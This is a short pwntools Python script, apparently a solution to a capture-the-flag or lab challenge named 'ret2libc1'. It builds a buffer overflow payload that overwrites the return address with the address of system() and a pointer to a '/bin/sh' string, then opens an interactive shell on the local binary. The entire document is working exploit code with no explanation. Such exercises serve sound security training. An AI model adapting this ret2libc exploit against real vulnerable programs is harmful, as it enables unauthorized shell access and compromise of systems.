from pwn import *



bin_sh_addr = 0x8048720
system_addr = 0x08048460
offset = 0x6c + 4
payload = b'A' * offset + p32(system_addr) + p32(0xcccccccc) + p32(bin_sh_addr)

sh = process('./ret2libc1')
sh.sendline(payload)
sh.interactive()
